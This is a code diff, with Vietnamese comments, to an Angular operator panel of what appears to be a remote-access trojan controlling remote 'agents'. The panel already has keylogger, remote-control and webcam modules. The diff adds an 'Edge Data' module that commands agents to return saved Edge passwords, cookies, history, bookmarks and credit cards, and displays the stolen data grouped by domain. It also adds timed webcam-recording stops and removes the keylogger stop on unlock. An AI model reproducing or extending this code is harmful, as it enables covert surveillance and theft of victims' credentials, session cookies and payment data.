@@ -50,6 +50,31 @@ export class AgentDetailComponent {
        a.exe.toLowerCase().includes(f)
     );
   }
+  private saveOnStop = true;
+private stopTimerId: any = null;
+stopSaveDelay = 0;      // giây
+stopNoSaveDelay = 0;   // giây
+private stopWebcamWithDelay(seconds: number, save: boolean) {
+  if (this.webcamBusy) return;
+
+  this.saveOnStop = save;
+
+  // Nếu không nhập hoặc nhập 0 → dừng ngay
+  if (!seconds || seconds <= 0) {
+    this.stopWebcamInternal();
+    return;
+  }
+
+  // huỷ timer cũ
+  if (this.stopTimerId) {
+    clearTimeout(this.stopTimerId);
+  }
+
+  this.stopTimerId = setTimeout(() => {
+    this.stopWebcamInternal();
+  }, seconds * 1000);
+}
+
   editorSavedFlash = false;
   selectedModule = signal<string | null>(null);
   processList = computed(() => this.ws.processList());
@@ -88,6 +113,8 @@ export class AgentDetailComponent {
   isKeyloggerLocked = false; 
   keyloggerRunning = signal(false);
   keyloggerLocked  = signal(false);
+  edgeResult = signal<any>(null);
+  edgeLoading = signal<boolean>(false);
   openEditorRequest(path: string) {
   this.ws.sendJson({
     module: "FILE",
@@ -116,6 +143,17 @@ export class AgentDetailComponent {
         // Khi server gửi READ_TEXT → mở editor
         this.applyEditorContent(data.path, data.content);
       });
+      effect(() => {
+  const msg = this.ws.lastMessage();
+  if (!msg || msg.module !== 'EDGE') return;
+
+   this.edgeLoading.set(false);
+
+  const rawData = msg.data ?? msg;
+
+  this.edgeResult.set(this.formatEdgeData(rawData));
+});
+
     }
   ngOnInit() {
     this.route.paramMap.subscribe(params => {
@@ -193,6 +231,7 @@ onDisconnectedCleanup() {
     { key: 'KEYLOGGER', label: 'Keylogger', icon: '⌨️' },
     { key: 'REMOTE', label: 'Remote', icon: '🎮' },
     { key: 'GALLERY', label: 'Gallery', icon: '🗂️' },
+    { key: 'EDGE', label: 'Edge Data', icon: '🌐' },
   ];
   backToModules() {
     this.selectedModule.set(null);
@@ -366,8 +405,11 @@ killApp(name:string|null)
    this.killApp1(name);
    setTimeout(() => {
     this.sendAppList();
-  }, 300);
+  }, 2000);
   this.killExeName="";
+   setTimeout(() => {
+    this.sendAppList();
+  }, 2000);
 }
   // ================================
   // KEYLOGGER
@@ -414,10 +456,10 @@ handleEditorShortcut(event: KeyboardEvent) {
      this.keyloggerLocked.set(true);
   }
   sendKeyloggerUnlock() {
-     if (!!this.keyloggerRunning)
-    {
-      this.sendKeyloggerStop();
-    }
+    //  if (!!this.keyloggerRunning)
+    // {
+    //   this.sendKeyloggerStop();
+    // }
     this.ws.sendJson({ module: "KEYBOARD", command: "UNLOCK" });
    
    this.keyloggerLocked.set(false);
@@ -465,6 +507,82 @@ handleEditorShortcut(event: KeyboardEvent) {
     this.webcamBusy = false;
   }, 500);
   }
+  
+sendWebcamStopAndSave() {
+  if (this.webcamBusy) return;
+  this.saveOnStop = true;
+  this.stopWebcamInternal();   // DỪNG LIỀN
+}
+
+sendWebcamStopNoSave() {
+  if (this.webcamBusy) return;
+  this.saveOnStop = false;
+  this.stopWebcamInternal();   // DỪNG LIỀN
+}
+onStopSaveEnter() {
+  if (!this.isRecording || this.stopSaveDelay <= 0) return;
+
+  this.saveOnStop = true;
+  this.scheduleStop(this.stopSaveDelay);
+}
+
+onStopNoSaveEnter() {
+  if (!this.isRecording || this.stopNoSaveDelay <= 0) return;
+
+  this.saveOnStop = false;
+  this.scheduleStop(this.stopNoSaveDelay);
+}
+private scheduleStop(seconds: number) {
+  // huỷ timer cũ
+  if (this.stopTimerId) {
+    clearTimeout(this.stopTimerId);
+  }
+
+  this.stopTimerId = setTimeout(() => {
+    this.stopWebcamInternal();
+  }, seconds * 1000);
+}
+
+
+
+private stopWebcamInternal() {
+  this.webcamBusy = true;
+
+  // huỷ hẹn giờ nếu có
+  if (this.stopTimerId) {
+    clearTimeout(this.stopTimerId);
+    this.stopTimerId = null;
+  }
+
+  this.ws.sendJson({ module: "WEBCAM", command: "STOP_STREAM" });
+
+  if (this.isRecording && this.mediaRecorder) {
+    this.mediaRecorder.stop();
+  }
+
+  this.isRecording = false;
+
+  setTimeout(() => {
+    this.webcamBusy = false;
+  }, 500);
+}
+scheduleWebcamStop(seconds: number, save: boolean) {
+  if (!this.isRecording) return;
+
+  // huỷ timer cũ
+  if (this.stopTimerId) {
+    clearTimeout(this.stopTimerId);
+  }
+
+  this.saveOnStop = save;
+
+  this.stopTimerId = setTimeout(() => {
+    this.stopWebcamInternal();
+  }, seconds * 1000);
+}
+
+
+
   sendWebcamStopStream() {
       if (this.webcamBusy) return;
   this.webcamBusy = true;
@@ -513,7 +631,13 @@ handleEditorShortcut(event: KeyboardEvent) {
         this.mediaRecorder.ondataavailable = (e) => {
           if (e.data.size > 0) this.recordedChunks.push(e.data);
         };
-        this.mediaRecorder.onstop = () => this.saveVideoToServer();
+        this.mediaRecorder.onstop = () => {
+  if (this.saveOnStop) {
+    this.saveVideoToServer();
+  } else {
+    this.recordedChunks = []; // bỏ luôn
+  }
+};
         this.mediaRecorder.start();
         this.isRecording = true;
       }
@@ -809,4 +933,167 @@ handleEditorShortcut(event: KeyboardEvent) {
       payload: { x: pos.x, y: pos.y, type: 'up', btn: 'right' }
     });
   }
+  // Edge ================
+  sendEdgePasswords() {
+  this.sendEdgeCommand("GET_PASSWORDS");
+}
+
+sendEdgeCookies() {
+  this.sendEdgeCommand("GET_COOKIES");
+}
+
+sendEdgeHistory() {
+  this.sendEdgeCommand("GET_HISTORY");
+}
+
+sendEdgeBookmarks() {
+  this.sendEdgeCommand("GET_BOOKMARKS");
+}
+
+sendEdgeCreditCards() {
+  this.sendEdgeCommand("GET_CREDIT_CARDS");
+}
+
+private sendEdgeCommand(command: string) {
+  this.edgeLoading.set(true);
+  this.edgeResult.set(null);
+
+  this.ws.sendJson({
+    module: "EDGE",
+    command
+  });
+}
+formatEdgeData(data: any) {
+  if (Array.isArray(data)) {
+    return data.map(item => this.formatEdgeItem(item));
+  }
+  return this.formatEdgeItem(data);
+}
+
+private formatEdgeItem(item: any) {
+  const formatted = { ...item };
+
+  // Password
+  if (formatted.password) {
+    formatted.password = '••••••••';
+    formatted.password_status = 'Encrypted (AES-GCM)';
+  }
+
+  // Credit card number
+  if (formatted.number) {
+    formatted.number = '•••• •••• •••• ••••';
+    formatted.card_status = 'Encrypted (AES-GCM)';
+  }
+
+  // Encryption flag
+  if (formatted.encryption === 'UNKNOWN') {
+    formatted.encryption = 'AES-GCM (Protected)';
+  }
+
+  return formatted;
+}
+get edgePasswords() {
+  return Array.isArray(this.edgeResult())
+    ? this.edgeResult().filter((x: any) => x.username && x.password)
+    : [];
+}
+
+get edgeCookies() {
+  return Array.isArray(this.edgeResult())
+    ? this.edgeResult().filter((x: any) => x.host_key && x.name)
+    : [];
+}
+
+get edgeHistory() {
+  return Array.isArray(this.edgeResult())
+    ? this.edgeResult().filter((x: any) => x.visits !== undefined)
+    : [];
+}
+
+get edgeBookmarks() {
+  return Array.isArray(this.edgeResult())
+    ? this.edgeResult().filter((x: any) => x.folder && x.url)
+    : [];
+}
+
+get edgeCreditCards() {
+  return Array.isArray(this.edgeResult())
+    ? this.edgeResult().filter((x: any) => x.exp_month && x.exp_year)
+    : [];
+}
+isPassword(item: any) {
+  return item.username && item.password;
+}
+
+isCookie(item: any) {
+  return item.host_key && item.name;
+}
+
+isHistory(item: any) {
+  return item.url && item.visits !== undefined;
+}
+
+isBookmark(item: any) {
+  return item.folder && item.url;
+}
+
+isCreditCard(item: any) {
+  return item.exp_month && item.exp_year;
+}
+get edgeCookieCount() {
+  return this.edgeCookies.length;
+}
+get cookiesByDomain() {
+  const map: any = {};
+  for (const c of this.edgeCookies) {
+    if (!map[c.host_key]) map[c.host_key] = [];
+    map[c.host_key].push(c);
+  }
+  return map;
+}
+// ================================
+// EDGE COOKIES – DEVTOOLS STYLE
+// Group: domain → cookie name → paths
+// ================================
+get edgeCookiesGrouped() {
+  const result: any[] = [];
+
+  const domainMap: Record<string, any> = {};
+
+  for (const c of this.edgeCookies) {
+    const domain = c.host_key;
+
+    if (!domainMap[domain]) {
+      domainMap[domain] = {};
+    }
+
+    if (!domainMap[domain][c.name]) {
+      domainMap[domain][c.name] = [];
+    }
+
+    domainMap[domain][c.name].push(c);
+  }
+
+  for (const domain of Object.keys(domainMap)) {
+    const cookies: any[] = [];
+
+    for (const name of Object.keys(domainMap[domain])) {
+      cookies.push({
+        name,
+        paths: domainMap[domain][name]
+      });
+    }
+
+    result.push({
+      domain,
+      cookies
+    });
+  }
+
+  return result;
+}
+getCookiePaths(paths: any[]) {
+  return paths.filter(p => p.path && p.path !== '/');
+}
+
 }
